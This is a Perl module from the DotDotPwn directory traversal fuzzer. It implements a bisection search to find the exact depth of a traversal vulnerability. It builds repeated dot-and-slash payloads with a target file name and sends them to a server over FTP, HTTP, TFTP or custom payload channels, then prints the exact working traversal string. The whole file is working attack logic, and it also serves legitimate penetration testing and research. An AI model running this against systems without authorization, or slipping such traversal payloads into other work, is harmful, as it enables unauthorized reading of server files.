#!/usr/bin/perl
# 
# Bisection Algorithm
# by nitr0us (nitrousenador@gmail.com)
# http://twitter.com/nitr0usmx
# http://chatsubo-labs.blogspot.com
#
# This is the implementation of the Bisection
# Method suggested by our friend LightOS.
#
# The graphical representation is in the slide 19:
# https://media.blackhat.com/bh-us-11/Arsenal/BH_US_11_Nitrous_DotDotPwn_Slides.pdf
# 
# This algorithm help us to detect the exact deepness
# of a directory traversal vulnerability once it has
# been found.
#
# The bisection method in mathematics, is a root-finding
# method which repeatedly bisects an interval then selects
# a subinterval in which a root must lie for further processing.
# 
# Source: http://en.wikipedia.org/wiki/Bisection_method
#

package DotDotPwn::BisectionAlgorithm;
use Exporter 'import';
@EXPORT = qw(BisectionAlgorithm);

## DotDotPwn Core Modules ##
use DotDotPwn::TraversalEngine;

## DotDotPwn Protocol Modules ##
use DotDotPwn::HTTP;
use DotDotPwn::HTTP_Url;
use DotDotPwn::FTP;
use DotDotPwn::TFTP;
use DotDotPwn::Payload;

## Perl modules ##
#use Switch;

sub BisectionAlgorithm{
	my ($a, $b, $bisection_traversal_in) = @_;
	my $vulnerable; # 1 or 0
	my $medium_point = int(($a + $b) / 2);
	# Will hold the combinations of dots and slashes taken from TraversalEngine.pm
	# as well as the Special Patterns.
	my @Traversal_Patterns;
	my $bisection_traversal_out; # Payload to be sent over the different protocols (modules)
	my $pattern, $trav_pattern;
	my $file, $url, $payload;

	foreach $dots (@DotDotPwn::TraversalEngine::Dots){
		foreach $slash (@DotDotPwn::TraversalEngine::Slashes){
			push @Traversal_Patterns, $dots . $slash;
		}
	}

	push @Traversal_Patterns, @DotDotPwn::TraversalEngine::Special_Patterns;

    # print "BisectionAlgorithm() INPUT: $bisection_traversal_in\n";

	# Reverse order to start the matching with the largest encoding representations
	# N-byte... 4-byte, 3-byte, and so on
	foreach (reverse @Traversal_Patterns){
		$pattern = $_;

		### REGEX Masquerading ###
		if($pattern =~ /\\/){
			$pattern =~ s/\\/\\\\/g;
		}

		if($pattern =~ /\//){
			$pattern =~ s/\//\\\//g;
		}

		if($pattern =~ /\./){
			$pattern =~ s/\./\\\./g;
		}
        if ($pattern =~ /\?/){
            $pattern =~ s/\?/\\\?/g;
        }
		### REGEX Masquerading ###

		### REGEX Matching ###
		if($bisection_traversal_in =~ /$pattern$pattern/g ){
			$trav_pattern = $_;
			last;
		}
	}

    # print "REGEX pattern is '$pattern' (of matched traversal pattern '$trav_pattern')\n";

	#switch($main::module){
	if ($main::module eq "ftp")  {
			$bisection_traversal_in =~ /($pattern)+(.+)/;
			# print "REGEX matched memories \$1: $1 - \$2: $2\n";
			$file = $2;
			$payload = $trav_pattern x $medium_point;
			$bisection_traversal_out= $payload . $file;

			# print "BisectionAlgorithm() OUTPUT: $bisection_traversal_out\n";
			$vulnerable = DotDotPwn::FTP::FuzzFTP($main::host, $main::port, $main::user, $main::pass, $bisection_traversal_out);
	}
	if ($main::module eq "http") {
			$bisection_traversal_in =~ /($pattern)+(.+)/;
			# print "REGEX matched memories \$1: $1 - \$2: $2\n";
			$file = $2;
			$url  = "http://" . $main::host . ($main::port ? ":$main::port" : "") . "/";
			$payload = $trav_pattern x $medium_point;
			$bisection_traversal_out= $url . $payload . $file;

			# print "BisectionAlgorithm() OUTPUT: $bisection_traversal_out\n";
			$vulnerable = DotDotPwn::HTTP::FuzzHTTP("USELESS", "USELESS", $main::method, $bisection_traversal_out);
	}
	if ($main::module eq "tftp") {
			$bisection_traversal_in =~ /($pattern)+(.+)/;
			# print "REGEX matched memories \$1: $1 - \$2: $2\n";
			$file = $2;
			$payload = $trav_pattern x $medium_point;
			$bisection_traversal_out= $payload . $file;

			# print "BisectionAlgorithm() OUTPUT: $bisection_traversal_out\n";
			$vulnerable = DotDotPwn::TFTP::FuzzTFTP($main::host, $main::port, $bisection_traversal_out);
	}
	if ($main::module eq "http-url") {
			# Get the filename from the URL
			$bisection_traversal_in =~ /($pattern)+(.+)/;
            # print "REGEX matched memories \$1: $1 - \$2: $2\n";
			$file = $2;
			$url = $main::url;
			$payload = $trav_pattern x $medium_point;

			$url =~ s/TRAVERSAL//;
			$bisection_traversal_out = $url . $payload . $file;

            # print "BisectionAlgorithm() OUTPUT: $url $file $payload $bisection_traversal_out\n";
			$vulnerable = DotDotPwn::HTTP_Url::FuzzHTTP_Url( 0, 0,$bisection_traversal_out);
	}
	if ($main::module eq "payload") {
			# (nitr0us) It could be improved, definitely. The \s instead of the whitespace in the REGEX never worked =@ grr
			$bisection_traversal_in =~ /($pattern)+(.+) /g;
			# print "REGEX matched memories \$1: $1 - \$2: $2\n";
			$file = $2;
			$payload = $trav_pattern x $medium_point . $file;
			$bisection_traversal_out = $main::payload;
			$bisection_traversal_out =~ s/TRAVERSAL/$payload/g;

			# print "BisectionAlgorithm() OUTPUT: $bisection_traversal_out\n";
			$vulnerable = DotDotPwn::Payload::FuzzPayload($main::host, $main::port, "USELESS", $bisection_traversal_out);
	}
	#}

	printf "[+] Medium point between %2d - %2d = $medium_point;\tVulnerable = " . ($vulnerable ? "YES" : "NO") . "\n", $a, $b;

	if(($b - $a) < 2 ){
		if($vulnerable){
			print "\n[+] EXACT TRAVERSAL: $bisection_traversal_out\n";
			print "[+] EXACT DEEPNESS : $medium_point times '$trav_pattern'\n";
		} else {
			if($main::module ne "payload"){
				print "\n[+] EXACT TRAVERSAL: " . $trav_pattern x $b . $file . "\n";
				print "[+] EXACT DEEPNESS : $b times '$trav_pattern'\n";
			} else {
				print "\n[+] EXACT PAYLOAD:\n";
				$payload = $trav_pattern x $b . $file;
				$bisection_traversal_out = $main::payload;
				$bisection_traversal_out =~ s/TRAVERSAL/$payload/g;
				print $bisection_traversal_out;
				print "[+] EXACT DEEPNESS : $b times '$trav_pattern'\n";
			}
		}
	} else {
		if($vulnerable){
			$b = $medium_point;
		} else {
			$a = $medium_point;
		}

		# print "\nBisectionAlgorithm($a, $b) (Recursive)\n\n";
		return BisectionAlgorithm($a, $b, $bisection_traversal_out);
	}
}
